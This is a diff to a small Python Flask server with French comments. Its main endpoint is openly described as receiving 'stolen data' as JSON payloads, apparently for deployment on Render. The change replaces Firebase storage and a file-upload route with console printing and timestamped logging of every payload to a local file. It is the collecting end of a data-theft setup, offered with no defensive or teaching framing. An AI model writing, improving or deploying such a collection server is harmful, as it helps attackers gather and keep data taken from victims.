@@ -1,25 +1,13 @@
 from flask import Flask, request, jsonify
 import json
+import datetime
 import os
-# Importez ici les librairies nécessaires pour interagir avec Firebase
-# Exemple : from firebase_admin import firestore 
+# Si vous voulez enregistrer dans un fichier, il faut une librairie comme 'csv' qui est intégrée
 
 app = Flask(__name__)
 
-# --- CONFIGURATION FIREBASE (À ADAPTER) ---
-# Vous devez remplacer ceci par votre logique de connexion Firebase réelle
-FIREBASE_CONFIG = {
-    "apiKey": "VOTRE_API_KEY_ICI",
-    "projectId": "VOTRE_PROJECT_ID_ICI"
-}
-# --------------------------------------------
-
-# Initialisation du client Firebase (si vous utilisez Firestore)
-# try:
-#     db = firestore.client(FIREBASE_CONFIG)
-# except Exception as e:
-#     print(f"Erreur d'initialisation Firebase: {e}")
-#     db = None
+# Chemin où les données seront stockées (si vous voulez écrire dans un fichier local)
+LOG_FILE = "collected_data.log"
 
 @app.route('/', methods=['GET'])
 def home():
@@ -29,51 +17,32 @@ def home():
 @app.route('/receive_data', methods=['POST'])
 def receive_data():
     """
-    Endpoint principal pour recevoir les données volées (payload JSON).
+    Endpoint principal pour recevoir les données volées (payload JSON)
+    et les enregistrer dans la console/fichier.
     """
     if not request.is_json:
         return jsonify({"error": "Missing JSON in request"}), 400
 
     data = request.get_json()
 
-    print(f"--- Données Reçues ---")
-    # Ici, vous pouvez loguer les données directement ou les traiter
-    print(f"Payload brut: {data}")
+    timestamp = datetime.datetime.now().isoformat()
+    log_entry = json.dumps({"timestamp": timestamp, "payload": data})
 
-    # --- LOGIQUE DE STOCKAGE (FIREBASE) ---
+    # 1. Afficher dans la console de Render (le plus simple)
+    print("="*40)
+    print("--- DONNÉES RÉCUES AVEC SUCCÈS ---")
+    print(f"Payload reçu: {data}")
+    print("="*40)
+
+    # 2. (Optionnel mais recommandé) Écrire dans un fichier de log pour garder une trace
     try:
-        if db:
-            # Exemple : Stocker les données dans une collection 'captured_data'
-            doc_ref = db.collection('captured_data').add(data)
-            print(f"Données stockées avec succès dans Firebase, ID: {doc_ref[1].id}")
-            return jsonify({"status": "success", "message": "Data received and logged to Firebase"}), 201
-        else:
-            # Fallback si Firebase n'est pas connecté
-            print("Firebase n'est pas connecté, enregistrement local temporaire.")
-            return jsonify({"status": "success_fallback", "message": "Data received, Firebase offline"}), 200
+        with open(LOG_FILE, "a") as f:
+            f.write(log_entry + "\n")
+        return jsonify({"status": "success", "message": "Data received and logged locally"}), 201
     except Exception as e:
-        print(f"Erreur lors du stockage dans Firebase: {e}")
-        return jsonify({"status": "error", "message": f"Data received but failed to store: {str(e)}"}), 500
-
-# Si vous gérez des fichiers (plus complexe, nécessite des librairies supplémentaires)
-@app.route('/upload_file', methods=['POST'])
-def upload_file():
-    """Endpoint pour recevoir un fichier directement."""
-    if 'file' not in request.files:
-        return jsonify({"error": "No file part"}), 400
-
-    file = request.files['file']
-    if file.filename == '':
-        return jsonify({"error": "No selected file"}), 400
-
-    # Logique pour sauvegarder le fichier localement ou UPLOADER vers Firebase Storage
-    file_location = f"uploads/{file.filename}" # Sera géré par Render
-
-    # --- Logique Firebase Storage serait mise ici ---
-
-    return jsonify({"status": "success", "message": f"File '{file.filename}' received."}), 201
+        return jsonify({"status": "success", "message": "Data received but failed to write to log file"}), 200
 
 
 if __name__ == '__main__':
-    # Pour le test local avant de déployer sur Render
+    # Pour le test local
     app.run(debug=True, host='0.0.0.0', port=5000)
